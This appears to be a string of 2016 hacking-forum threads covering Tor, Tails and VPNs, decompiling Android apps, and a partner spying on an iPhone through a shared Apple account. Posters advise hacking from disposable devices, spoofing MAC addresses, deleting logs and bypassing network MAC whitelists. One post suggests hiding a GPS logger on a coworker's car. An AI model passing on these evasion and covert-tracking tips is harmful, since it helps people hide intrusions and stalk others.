So, unless you trust the vpn provider, you may want to avoid using vpns as your only method of anonymity.   Yes you are right, using a VPN with Tail is defenitly not recommended and should be avoided.   iirc it can become buggy with a VPN due to Tail doing everything over TOR.
First things first, if you're wandering into dark waters, don't do it from home. (I'm not implying anything illegal  )  Only hack with devices that you aren't afraid to permanently dispose of. It's good to have several USB nic's. Always boot without networking enable, spoof you're mac address. Also, research proxy chains. There are scripts all over the net tailored to specific os's for deleting logs. A live os like tails should only run in ram and not generate persistent logs. Security is about layers. There is no catch all.
Quote by Stranded_Only hack with devices that you aren't afraid to permanently dispose of.    Like a Raspberry Pi!   JK.   Well actually wouldn't be a bad option for certain jobs!

TOR has pretty much  been a focus point for the feds to find bad people. If you arne't doing anything bad there is nothing to worry about. But as there are nodes ( the last node where data is decrypted) someone else has control over your sessions. And once someone has control over you, its game over in my opinion.

The cloud host can still keep logs and probably does so they can prevent abuse of their services.  You also end up with a static IP address because you can't just change locations.

Interesting  Thanks for the tips. How can MAC addresses be "dangerous" if not changed?
With your real MAC-Adress it is usually easy to find out the brand of your device remotely. When you do nasty things in a LAN this can be some very identifying information. By changing it, you can spoof the brand of the device.   Changing the MAC-Adress can also be useful in networks that use whitelists to control which devices can connect to it and which can't. Simply change your MAC-Adress to the MAC of an allowed device, and now you can connect to a network with whitelisting enabled (e.g. you can pretend to be any device you want).   There are probably more use cases for this, but these are the ones I know...

I'd use JDGUI first and go from there. Note that unless you understand java, decompiled java is still a bit of a pain to navigate
Like x_X said, you can do just about anything you want to with JD-GUI. apktool is also pretty handy. You will also need AndroidSDK if you plan on patching/recompiling.
In addition, you can also check out those tools : Jadx and Bytecode Viewer.  I personally use Jadx.

There are a few options of doing this; though your simplest option would probably be picking up a cheap magnetic GPS logger to stick on the bottom of their car.   Though there's probably an easier way for this to be resolved... if your boss really doesn't believe him, and he's the boss, and this is happening too frequently, why doesn't your boss just tell your coworker that he can't leave work early any more?   Edit: Keep in mind your country's laws about vehicle tracking. Most countries have laws in place about domestic usage that only make vehicle tracking legal if the vehicle owner consents to the tracking.

Now, i don't know much about Iphones (Are you sure its an Iphone?) but sounds like your mates boyfriend installed a Remote Administration Tool on her phone. This kind of software is used for spying on people, he can get call logs, messages and pretty much anything he wants. So do you want to know how to remove it or learn how to do it yourself?
Be more specific. Which iPhone, which iOS, is it jailbroken or not?
I'd love to know how to do both if that's possible? He said something about how he has to individually hack into each app? That's really all I know!
Oh sorry - it's an IPhone 5c - IOS : 9.3.3  and it's not jailbroken!
He has access to her Apple account. With this, he can trivially connect to her iMessage and iCloud account containing mail, messages, contacts etc. Change the account password or even better, register a new Apple ID           Edited by trenace (Monday 8th of August 2016 01:25:06 AM)
